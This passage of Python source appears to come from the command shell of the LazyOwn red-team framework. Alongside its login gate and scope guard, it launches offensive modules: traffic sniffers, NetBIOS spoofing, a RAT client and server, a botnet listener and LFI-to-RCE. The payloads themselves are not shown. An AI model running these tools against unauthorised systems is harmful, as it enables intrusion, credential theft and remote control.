                    ).glob("*.lua")
                ],
            )
            return [s.text for s in completer.complete(cmd, partial)]
        except Exception:
            return []

    def preloop(self):
        """Print a session-start pro tip and handle first-run setup.

        Also attempts auto-login via remember-me token.
        If no session exists, warns the operator to use ``login``.
        """
        import os as _os
        import sys as _sys
        _sessions = getattr(self, "sessions_dir", "sessions") or "sessions"
        _legacy_sentinel = _os.path.join(_sessions, "theone")
        _config_dir = _os.path.join(_os.path.expanduser("~"), ".config", "lazyown")
        _sentinel = _os.path.join(_config_dir, "onboarded")

        if _os.path.exists(_legacy_sentinel) and not _os.path.exists(_sentinel):
            try:
                _os.makedirs(_config_dir, exist_ok=True)
                open(_sentinel, "w").close()
            except Exception:
                pass

        if not _os.path.exists(_sentinel) and not _sys.stdin.isatty():
            return

        try:
            from modules.cli_auth import try_auto_login

            auto_result = try_auto_login()
            if auto_result.get("success"):
                self.operator_name = auto_result["username"]
        except Exception:
            pass

        try:
            from core.credential_vault import check_dangerous_defaults
            from core.credential_vault import seal_payload, seal_value
            from core.config import save_payload
            payload = load_payload()
            warnings = check_dangerous_defaults(payload)
            if warnings:
                print_warn(
                    f"\n  Security: {len(warnings)} credential(s) still use default values."
                )
                for w in warnings[:3]:
                    print_warn(f"    {w}")
                if len(warnings) > 3:
                    print_warn(f"    ... and {len(warnings) - 3} more. Run 'configure_credentials' to fix.")
                if "CHANGE_ME" in str(payload.get("aes_key", "")):
                    print_msg("    AES key is default; sealing credentials now for safety.")
                    try:
                        sealed = seal_payload(payload)
                        save_payload(sealed)
                        print_msg("    Credentials sealed. Re-encrypted with fresh AES key.")
                    except Exception:
                        pass
        except Exception:
            pass

        if not _os.path.exists(_sentinel):
            # ── First run ────────────────────────────────────────────────────
            try:
                from rich.console import Console as _SplashConsole

                from cli.splash import render_splash as _render_splash
                _render_splash(
                    _SplashConsole(),
                    ["LazyOwn", "RedTeam Framework"],
                    payload=self.params,
                )
            except Exception:
                pass
            print_msg(
                "\n  Welcome to LazyOwn — it looks like this is your first launch.\n"
                "  We will walk you through two quick setup steps:\n"
                "    1. config_banner — customise your prompt segments.\n"
                "    2. wizard        — configure rhost, lhost, wordlists, and more.\n"
                "  You can press Ctrl-C at any time to skip a step.\n"
            )
            try:
                self.do_config_banner("")
            except KeyboardInterrupt:
                print_warn("config_banner skipped.")
            except Exception:
                pass
            try:
                self.do_wizard("--tutorial")
            except KeyboardInterrupt:
                print_warn("wizard skipped.")
            except Exception:
                pass
            print_msg(
                "\n  Setup complete. Suggested first commands:\n"
                "    ping          — verify connectivity to rhost (sets os_id)\n"
                "    lazynmap      — full port + service scan\n"
                "  Run  recommend_next  at any time for phase-aware guidance.\n"
            )
            try:
                from modules.cli_auth import needs_login

                if needs_login():
                    print_warn(
                        "\n  You are not logged in. The prompt shows [anonymous].\n"
                        "  ELO, karma, and gym progress won't be tracked until you login.\n"
                        "  Use: register <username>  (first time)  or  login --remember <username>"
                    )
            except Exception:
                pass
            # Mark as initialised so this block never runs again
            try:
                _os.makedirs(_config_dir, exist_ok=True)
                open(_sentinel, "w").close()
            except Exception:
                pass
        else:
            # ── Normal session tip ───────────────────────────────────────────
            try:
                from modules.cli_auth import needs_login

                if needs_login():
                    print_warn(
                        "Not logged in — prompt shows [anonymous]. Use 'register' to create an account or 'login --remember <username>'."
                    )
            except Exception:
                pass
            try:
                enabled = str(self.params.get("enable_inline_hints", True)).lower() not in ("false", "0", "no")
                if enabled:
                    ctx = {
                        "phase":   self.params.get("phase")   or "",
                        "os_id":   str(self.params.get("os_id") or ""),
                        "rhost":   self.params.get("rhost")   or "",
                        "domain":  self.params.get("domain")  or "",
                        "api_key": self.params.get("api_key") or "",
                        "lhost":   self.params.get("lhost")   or "",
                    }
                    _print_session_tip(ctx)
            except Exception:
                pass

    def postparsing_precmd(self, statement):
        """Gate unauthenticated commands — anonymous operators can only
        run ``register``, ``login``, ``logout``, ``whoami``, ``help``, ``exit``, ``quit``,
        and ``set`` until they identify themselves.

        Returns:
            The original statement to allow execution, or a statement with
            an empty command string to block execution.
        """
        allowed = frozenset({"login", "logout", "register", "whoami", "help", "exit", "quit", "set", "eof", "eos"})
        cmd_name = (statement.command or "").lower()

        if cmd_name in allowed:
            return statement

        try:
            from modules.cli_auth import needs_login
            if not needs_login():
                return statement
        except ImportError:
            return statement

        from utils import print_warn
        print_warn("Authentication required. Use: register  (first time)  or  login --remember <username>")
        return ""

    def postloop(self):
        """
        Handle operations to perform after exiting the command loop.

        This method is called after the command loop terminates, typically used
        for performing any final cleanup or displaying messages before the program
        exits.

        In this implementation, it prints a message indicating that the custom
        shell is exiting.

        License: This function is part of a program released under the GNU General
        Public License v3.0 (GPLv3). You can redistribute it and/or modify it
        under the terms of the GPLv3, as published by the Free Software Foundation.

        Note: This method is called automatically by the `cmd` library's command
        loop after the loop terminates. You can override it in a subclass to
        customize its behavior.

        Example:
            >>> shell = LazyOwnShell()
            >>> shell.cmdloop()  # Exits the command loop
            GoodBye LazyOwner
        """
        print_warn("GoodBye LazyOwner")

    @cmd2.with_category(miscellaneous_category)

    def complete_phase(self, text, line, begidx, endidx):
        """Tab-complete phase names."""
        return [p for p in _PHASES if p.startswith(text)]

    @cmd2.with_category(miscellaneous_category)

    def complete_l00t(self, text, line, begidx, endidx):
        """Tab-complete l00t subcommands."""
        subs = ("search", "reuse", "graph", "mark")
        return [s for s in subs if s.startswith(text)]

    @cmd2.with_category(miscellaneous_category)

    def complete_loot(self, text, line, begidx, endidx):
        """Tab-complete loot subcommands (delegates to l00t)."""
        return self.complete_l00t(text, line, begidx, endidx)

    @cmd2.with_category(miscellaneous_category)

    def complete_assign(self, text, line, begidx, endidx):
        """Tab-complete the parameter name from the live payload keys.

        Driven entirely by ``self.params`` so the framework never has to
        maintain a parallel list of completion targets — adding a new key to
        ``payload.json`` makes it tab-completable for free.
        """
        try:
            tokens = shlex.split(line[:endidx]) if line else []
        except ValueError:
            tokens = line[:endidx].split()
        index = len(tokens) - (0 if line[:endidx].endswith(" ") else 1)
        if index != 1:
            return []
        return sorted(key for key in self.params if key.startswith(text))

    @cmd2.with_category(miscellaneous_category)

    def complete_scope(self, text, line, begidx, endidx):
        """Tab-complete the scope subcommands."""
        try:
            tokens = shlex.split(line[:endidx]) if line else []
        except ValueError:
            tokens = line[:endidx].split()
        index = len(tokens) - (0 if line[:endidx].endswith(" ") else 1)
        if index == 1:
            return [a for a in ("add", "rm", "clear", "mode") if a.startswith(text)]
        if index == 2 and tokens[1].lower() == "mode":
            return [m for m in ("off", "warn", "enforce") if m.startswith(text)]
        return []

    def _scope_entries(self) -> list:
        """Return the current scope as a fresh mutable list of entry strings."""
        from cli.scope_guard import normalize_scope

        return list(normalize_scope(self.params.get("scope")))

    def _scope_save(self, entries: "list | None" = None, mode: "str | None" = None) -> None:
        """Persist scope and/or mode changes to ``payload.json``.

        Mutates ``self.params`` in place and writes through the same atomic
        ``save_payload`` path used by ``assign``, keeping a single writer for
        the config file.

        Args:
            entries: Replacement scope list, or ``None`` to leave it unchanged.
            mode: Replacement enforcement mode, or ``None`` to leave it
                unchanged.
        """
        if entries is not None:
            self.params["scope"] = entries
        if mode is not None:
            self.params["scope_enforcement"] = mode
        _save_payload(self.params)

    def _scope_render(self, entries: list, mode: str) -> None:
        """Print the current scope and enforcement mode."""
        print_msg(f"{YELLOW}Scope enforcement mode:{RESET} {GREEN}{mode}{RESET}")
        if not entries:
            print_msg(
                f"{YELLOW}Authorized scope is empty — the guard is dormant. "
                f"Add entries with {GREEN}scope add <cidr|ip|host>{RESET}"
            )
            return
        print_msg(f"{YELLOW}Authorized scope ({len(entries)}):{RESET}")
        for entry in entries:
            print_msg(f"    {GREEN}{entry}{RESET}")

    @with_category("10. Command & Control")

    def complete_palette(self, text, line, begidx, endidx):
        """Tab-complete the palette command using the live command index.

        Position 1 yields phase identifiers and the ``--search`` / ``--info``
        verbs; position 2 yields phase-scoped command names (or every name
        when the first token is ``--info``). Driven entirely by
        :class:`cli.palette_command.PaletteCompleter` so the framework never
        has to maintain a parallel completion list — regenerating the index
        is enough.
        """
        try:
            index = _load_command_index()
        except _CommandIndexError:
            return []
        return _PALETTE_COMPLETER.complete(text, line, endidx, index)

    @cmd2.with_category(recon_category)
    def run_lazysearch(self):
        """
        Runs the internal module `modules/lazysearch.py`.

        This method executes the `lazysearch` script from the specified path, using
        the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
        is not set, it prints an error message.

        :return: None
        """
        binary_name = self.params["binary_name"]
        if not binary_name:
            print_error("binary_name not set")
            return
        self.run_script("modules/legacy/lazysearch.py", binary_name)

    @cmd2.with_category(recon_category)
    def run_lazysearch_gui(self):
        """
        Run the internal module located at `modules/LazyOwnExplorer.py`.

        This method executes the `LazyOwnExplorer.py` script, which is used for graphical user interface (GUI) functionality within the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `LazyOwnExplorer.py` to execute the GUI module.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/LazyOwnExplorer.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/LazyOwnExplorer.py`

        Example:
            To run `LazyOwnExplorer.py` directly, execute:
            `python3 modules/LazyOwnExplorer.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
            - Verify that your environment supports GUI operations if using this script in a non-graphical environment.
        """

        self.run_script("modules/LazyOwnExplorer.py")
        return

    @cmd2.with_category(scanning_category)
    def run_lazyown(self):
        """
        Run the internal module located at `modules/lazyown.py`.

        This method executes the `lazyown.py` script, which is a core component of the LazyOwn framework.

        The function performs the following steps:

        1. Calls `self.run_script` with `lazyown.py` to execute the script.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazyown.py` script is present in the `modules` directory.
        2. Run the script with:
            `python3 modules/lazyown.py`

        Example:
            To run `lazyown.py` directly, execute:
            `python3 modules/lazyown.py`

        Note:
            - Ensure that the script has the appropriate permissions and dependencies to run.
        """

        self.run_script("modules/lazyown.py")
        return

    @cmd2.with_category(miscellaneous_category)
    def run_update_db(self):
        """
        Run the internal module located at `modules/update_db.sh`.

        This method executes the `update_db.sh` script to update the database of binary exploitables from `gtofbins`.

        The function performs the following steps:

        1. Executes the `update_db.sh` script located in the `modules` directory using `os.system`.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/update_db.sh` script is present in the `modules` directory.
        2. Run the script with:
            `./modules/update_db.sh`

        Example:
            To manually update the database, execute:
            `./modules/update_db.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with the necessary privileges if required.
        """

        self.cmd("./modules/update_db.sh")
        return

    @cmd2.with_category(scanning_category)
    def run_lazynmap(self):
        """
        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

        OS detection (via ping TTL) is performed automatically before scanning
        when the target OS is not yet known. This ensures the correct tool chain
        is selected for subsequent enumeration: SMB/Kerberos/AD for Windows,
        SSH/web for Linux/Unix.

        This method executes the `lazynmap` script, using the current working directory
        and the `rhost` parameter from the `self.params` dictionary as the target IP.
        If `rhost` is not set, it prints an error message.

        :return: None
        """
        path = os.getcwd()
        target_ip = self.params["rhost"]
        if not target_ip:
            print_error(f"rhost must be assign, {GREEN}help assign to more info {RESET}")
            return

        # Gate: ensure OS is identified before scanning.
        # Read sessions/os.json; if absent or empty, run ping first so that
        # tool selectors downstream have a valid os_id to work with.
        os_json_path = "sessions/os.json"
        os_known = False
        try:
            if os.path.isfile(os_json_path):
                with open(os_json_path) as _f:
                    _data = json.load(_f)
                    if _data and _data[0].get("state") == "active":
                        os_known = True
        except Exception:
            pass

        if not os_known:
            print_msg(
                "OS not yet identified — running ping before nmap "
                "to select the correct tool chain."
            )
            self.onecmd("ping")

        self.cmd(f"{path}/modules/lazynmap.sh -t {target_ip}")

        try:
            from rich.console import Console as _PostScanConsole

            from cli.lazynmap_post import run_post_scan as _run_post_scan

            _run_post_scan(
                target=target_ip,
                payload=self.params,
                console=_PostScanConsole(highlight=False, soft_wrap=True),
            )
        except Exception as _post_exc:
            print_warn(f"recon plan post-processing failed: {_post_exc}")

        if (self.params.get("api_key") or "").strip():
            self.onecmd("vulnbot_groq")
        else:
            print_warn(
                "Skipping vulnbot_groq: 'api_key' not set in payload.json "
                "(use 'assign api_key <token>' to enable Groq-backed analysis)."
            )
        self.onecmd("report")
        return

    @cmd2.with_category(scanning_category)
    def run_lazywerkzeugdebug(self):
        """
        Run the internal module located at `modules/legacy/lazywerkzeug.py` in debug mode.

        This method executes the `lazywerkzeug.py` script with the specified parameters for remote and local hosts and ports. It is used to test Werkzeug in debug mode.

        The function performs the following steps:

        1. Retrieves the `rhost`, `lhost`, `rport`, and `lport` values from `self.params`.
        2. Checks if all required parameters are set. If not, prints an error message and returns.
        3. Calls `self.run_script` with `lazywerkzeug.py` and the specified parameters.

        :param rhost: The remote host address.
        :type rhost: str

        :param lhost: The local host address.
        :type lhost: str

        :param rport: The remote port number.
        :type rport: int

        :param lport: The local port number.
        :type lport: int

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `lhost`, `rport`, and `lport` are assign in `self.params`.
        2. The script `modules/legacy/lazywerkzeug.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazywerkzeug.py <rhost> <rport> <lhost> <lport>`

        Example:
            To run `lazywerkzeug.py` with `rhost` assign to `"127.0.0.1"`, `rport` to `5000`, `lhost` to `"localhost"`, and `lport` to `8000`, set:
            `self.params["rhost"] = "127.0.0.1"`
            `self.params["rport"] = 5000`
            `self.params["lhost"] = "localhost"`
            `self.params["lport"] = 8000`
            Then call:
            `run_lazywerkzeugdebug()`

        Note:
            - Ensure that `modules/legacy/lazywerkzeug.py` has the appropriate permissions and dependencies to run.
            - Verify that the specified hosts and ports are correct and available.
        """

        rhost = self.params["rhost"]
        lhost = self.params["lhost"]
        rport = self.params["rport"]
        lport = self.params["lport"]
        if not rhost or not lhost or not lport or not rport:
            print_error(
                "rhost, lhost, rpor, and lport must be assign, to more info see: help set"
            )
            return
        self.run_script("modules/legacy/lazywerkzeug.py", rhost, rport, lhost, lport)
        return

    @cmd2.with_category(scanning_category)
    def run_lazygath(self):
        """
        Run the internal module located at `modules/lazygat.sh`. to gathering the sistem :)

        This method executes the `lazygat.sh` script located in the `modules` directory with `sudo` privileges.

        The function performs the following steps:

        1. Retrieves the current working directory.
        2. Executes the `lazygat.sh` script using `sudo` to ensure it runs with elevated permissions.

        :returns: None

        Manual execution:
        1. Ensure that the `modules/lazygat.sh` script is present in the `modules` directory.
        2. Run the script with:
            `sudo ./modules/lazygat.sh`

        Example:
            To manually run the script with elevated privileges, execute:
            `sudo ./modules/lazygat.sh`

        Note:
            - Ensure that the script has execute permissions.
            - The script should be run with `sudo` if it requires elevated privileges.
        """

        path = os.getcwd()
        self.cmd(f"sudo {path}/modules/lazygat.sh")
        return

    @cmd2.with_category(scanning_category)
    def run_lazynmapdiscovery(self):
        """
        Runs the internal module `modules/lazynmap.sh` with discovery mode.

        This method executes the `lazynmap` script in discovery mode. It uses the current
        working directory for locating the script.

        :return: None
        """

        path = os.getcwd()
        self.cmd(f"{path}/modules/lazynmap.sh -d")
        return

    @cmd2.with_category(scanning_category)
    def run_lazysniff(self):
        """
        Run the sniffer internal module located at `modules/legacy/lazysniff.py` with the specified parameters.

        This method executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazysniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is assign in `self.params`.
        2. The script `modules/legacy/lazysniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazysniff.py -i <device>`

        Example:
            To run `lazysniff` with `device` assign to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazysniff()`

        Note:
            - Ensure that `modules/legacy/lazysniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """


        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/legacy/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    @cmd2.with_category(scanning_category)
    def run_lazyftpsniff(self):
        """
        Run the sniffer ftp internal module located at `modules/legacy/lazyftpsniff.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `device`: The network interface to be used for sniffing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `device` value from `self.params`.
        2. Sets up the environment variables `LANG` and `TERM` to ensure proper script execution.
        3. Uses `subprocess.run` to execute the `lazyftpsniff.py` script with the `-i` option to specify the network interface.

        :param device: The network interface to be used for sniffing.
        :type device: str

        :returns: None

        Manual execution:
        1. Ensure that `device` is assign in `self.params`.
        2. The script `modules/legacy/lazyftpsniff.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazyftpsniff.py -i <device>`

        Example:
            To run `lazyftpsniff` with `device` assign to `"eth0"`, set:
            `self.params["device"] = "eth0"`
            Then call:
            `run_lazyftpsniff()`

        Note:
            - Ensure that `modules/legacy/lazyftpsniff.py` has the appropriate permissions and dependencies to run.
            - Ensure that the network interface specified is valid and properly configured.
        """

        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print_error("device must be assign to choice the interface")
            return
        subprocess.run(["python3", "modules/legacy/lazyftpsniff.py", "-i", device])

    @cmd2.with_category(scanning_category)
    def run_lazynetbios(self):
        """
        Run the internal module to search netbios vuln victims, located at `modules/legacy/lazynetbios.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `startip`: The starting IP address for the NetBIOS scan, specified in `self.params`.
        - `endip`: The ending IP address for the NetBIOS scan, specified in `self.params`.
        - `spoof_ip`: The IP address to be used for spoofing, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `startip`, `endip`, and `spoof_ip` values from `self.params`.
        2. Uses `subprocess.run` to execute the `lazynetbios.py` script with the specified parameters.

        :param startip: The starting IP address for the NetBIOS scan.
        :type startip: str

        :param endip: The ending IP address for the NetBIOS scan.
        :type endip: str

        :param spoof_ip: The IP address to be used for spoofing.
        :type spoof_ip: str

        :returns: None

        Manual execution:
        1. Ensure that `startip`, `endip`, and `spoof_ip` are assign in `self.params`.
        2. The script `modules/legacy/lazynetbios.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazynetbios.py <startip> <endip> <spoof_ip>`

        Example:
            To run `lazynetbios` with `startip` assign to `"192.168.1.1"`, `endip` assign to `"192.168.1.10"`, and `spoof_ip` assign to `"192.168.1.100"`, assign:
            `self.params["startip"] = "192.168.1.1"`
            `self.params["endip"] = "192.168.1.10"`
            `self.params["spoof_ip"] = "192.168.1.100"`
            Then call:
            `run_lazynetbios()`

        Note:
            - Ensure that `modules/legacy/lazynetbios.py` has the appropriate permissions and dependencies to run.
            - Ensure that the IP addresses are correctly set and valid for the NetBIOS scan.
        """

        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/legacy/lazynetbios.py", startip, endip, spoof_ip])

    @cmd2.with_category(recon_category)
    def run_lazyhoneypot(self):
        """
        Run the internal module located at `modules/legacy/lazyhoneypot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `email_from`: The email address from which messages will be sent, specified in `self.params`.
        - `email_to`: The recipient email address, specified in `self.params`.
        - `email_username`: The username for email authentication, specified in `self.params`.
        - `email_password`: The password for email authentication, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `email_from`, `email_to`, `email_username`, and `email_password` values from `self.params`.
        2. Calls the `run_script` method to execute the `lazyhoneypot.py` script with the provided email parameters.

        :param email_from: The email address from which messages will be sent.
        :type email_from: str

        :param email_to: The recipient email address.
        :type email_to: str

        :param email_username: The username for email authentication.
        :type email_username: str

        :param email_password: The password for email authentication.
        :type email_password: str

        :returns: None

        Manual execution:
        1. Ensure that `email_from`, `email_to`, `email_username`, and `email_password` are assign in `self.params`.
        2. The script `modules/legacy/lazyhoneypot.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazyhoneypot.py --email_from <email_from> --email_to <email_to> --email_username <email_username> --email_password <email_password>`

        Example:
            To run `lazyhoneypot` with `email_from` assign to `"sender@example.com"`, `email_to` assign to `"recipient@example.com"`, `email_username` assign to `"user"`, and `email_password` assign to `"pass"`, set:
            `self.params["email_from"] = "sender@example.com"`
            `self.params["email_to"] = "recipient@example.com"`
            `self.params["email_username"] = "user"`
            `self.params["email_password"] = "pass"`
            Then call:
            `run_lazyhoneypot()`

        Note:
            - Ensure that `modules/legacy/lazyhoneypot.py` has the appropriate permissions and dependencies to run.
            - Ensure that the email credentials are correctly set for successful authentication and operation.
        """

        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/legacy/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )
    def run_lazysearch_bot(self):
        """
        Run the internal module GROQ AI located at `modules/legacy/lazysearch_bot.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `prompt`: The prompt to be used by the script, specified in `self.params`.
        - `api_key`: The API key to be assign in the environment variable `GROQ_API_KEY`, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the `prompt` and `api_key` values from `self.params`.
        2. Checks if both `prompt` and `api_key` are assign. If either is missing, it prints an error message and returns.
        3. Sets the environment variable `GROQ_API_KEY` with the provided `api_key`.
        4. Calls the `run_script` method to execute the `lazysearch_bot.py` script with the `--prompt` argument.

        :param prompt: The prompt to be used by the script.
        :type prompt: str

        :param api_key: The API key for accessing the service.
        :type api_key: str

        :returns: None

        Manual execution:
        1. Ensure that `prompt` and `api_key` are assign in `self.params`.
        2. The script `modules/legacy/lazysearch_bot.py` should be present in the `modules` directory.
        3. Set the environment variable `GROQ_API_KEY` with the API key value.
        4. Run the script with:
            `python3 modules/legacy/lazysearch_bot.py --prompt <prompt>`

        Example:
            To run `lazysearch_bot` with `prompt` assign to `"Search query"` and `api_key` assign to `"your_api_key"`, assign:
            `self.params["prompt"] = "Search query"`
            `self.params["api_key"] = "your_api_key"`
            Then call:
            `run_lazysearch_bot()`

        Note:
            - Ensure that `modules/legacy/lazysearch_bot.py` has the appropriate permissions and dependencies to run.
            - The environment variable `GROQ_API_KEY` must be correctly assign for the script to function.
        """

        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print_error("Prompt and api_key must be assign")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/legacy/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        """
        Run the Metadata extractor internal module located at `modules/lazyown_metaextract0r.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `path`: The file path to be processed by the script, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the value for `path` from `self.params`.
        2. Checks if the `path` parameter is assign. If not, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyown_metaextract0r.py` script with the appropriate argument.

        :param path: The file path to be processed by the script.
        :type path: str

        :returns: None

        Manual execution:
        1. Ensure that `path` is assign in `self.params`.
        2. The script `modules/lazyown_metaextract0r.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyown_metaextract0r.py --path <path>`

        Example:
            To run `lazyown_metaextract0r` with `path` assign to `/home/user/file.txt`, set:
            `self.params["path"] = "/home/user/file.txt"`
            Then call:
            `run_lazymetaextract0r()`

        Note:
            - Ensure that `modules/lazyown_metaextract0r.py` has the appropriate permissions and dependencies to run.
        """

        path = self.params["path"]
        if not path:
            print_error("Path must be assign")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        """
        Run the internal module located at `modules/lazyownclient.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `lhost`, `lport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`lhost`, `lport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownclient.py` script with the appropriate arguments.

        :param lhost: The IP address of the local host.
        :type lhost: str
        :param lport: The port number of the local host.
        :type lport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `lhost`, `lport`, and `rat_key` are assign in `self.params`.
        2. The script `modules/lazyownclient.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownclient.py --host <lhost> --port <lport> --key <rat_key>`

        Example:
            To run `lazyownclient` with `lhost` assign to `192.168.1.10`, `lport` assign to `8080`, and `rat_key` assign to `my_secret_key`, set:
            `self.params["lhost"] = "192.168.1.10"`
            `self.params["lport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownratcli()`

        Note:
            - Ensure that `modules/lazyownclient.py` has the appropriate permissions and dependencies to run.
        """
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print_error("lhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        """
        Run the internal module located at `modules/lazyownserver.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, and `rat_key` from `self.params`.
        2. Checks if all required parameters (`rhost`, `rport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazyownserver.py` script with the appropriate arguments.

        :param rhost: The IP address of the remote host.
        :type rhost: str
        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rhost`, `rport`, and `rat_key` are assign in `self.params`.
        2. The script `modules/lazyownserver.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/lazyownserver.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazyownserver` with `rhost` set to `192.168.1.10`, `rport` assign to `8080`, and `rat_key` assign to `my_secret_key`, set:
            `self.params["rhost"] = "192.168.1.10"`
            `self.params["rport"] = 8080`
            `self.params["rat_key"] = "my_secret_key"`
            Then call:
            `run_lazyownrat()`

        Note:
            - Ensure that `modules/lazyownserver.py` has the appropriate permissions and dependencies to run.
        """

        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        """
        Run the internal module located at `modules/legacy/lazybotnet.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, hardcoded to "0.0.0.0".
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `rat_key`: The RAT key, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rport` and `rat_key` from `self.params`. The `rhost` is hardcoded to "0.0.0.0".
        2. Checks if all required parameters (`rport` and `rat_key`) are set. If any are missing, it prints an error message and returns.
        3. Calls the `run_script` method to execute the `lazybotnet.py` script with the appropriate arguments.

        :param rport: The port number of the remote host.
        :type rport: int
        :param rat_key: The RAT key.
        :type rat_key: str

        :returns: None

        Manual execution:
        1. Ensure that `rport` and `rat_key` are assign in `self.params`.
        2. The script `modules/legacy/lazybotnet.py` should be present in the `modules` directory.
        3. Run the script with:
            `python3 modules/legacy/lazybotnet.py --host <rhost> --port <rport> --key <rat_key>`

        Example:
            To run `lazybotnet` with `rport` assign to `1234` and `rat_key` assign to `my_key`, assign:
            `self.params["rport"] = 1234`
            `self.params["rat_key"] = "my_key"`
            Then call:
            `run_lazybotnet()`

        Note:
            - Ensure that `modules/legacy/lazybotnet.py` has the appropriate permissions and dependencies to run.
        """

        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print_error("rhost and lport and rat_key must be assign")
            return
        self.run_script(
            "modules/legacy/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        """
        Run the internal module located at `modules/legacy/lazylfi2rce.py` with the specified parameters.

        This function executes the script with the following arguments:

        - `rhost`: The IP address of the remote host, specified in `self.params`.
        - `rport`: The port number of the remote host, specified in `self.params`.
        - `lhost`: The IP address of the local host, specified in `self.params`.
        - `lport`: The port number of the local host, specified in `self.params`.
        - `field`: The field name for the LFI (Local File Inclusion) attack, specified in `self.params`.
        - `wordlist`: The path to the wordlist file used for the attack, specified in `self.params`.

        The function performs the following steps:

        1. Retrieves the values for `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` from `self.params`.
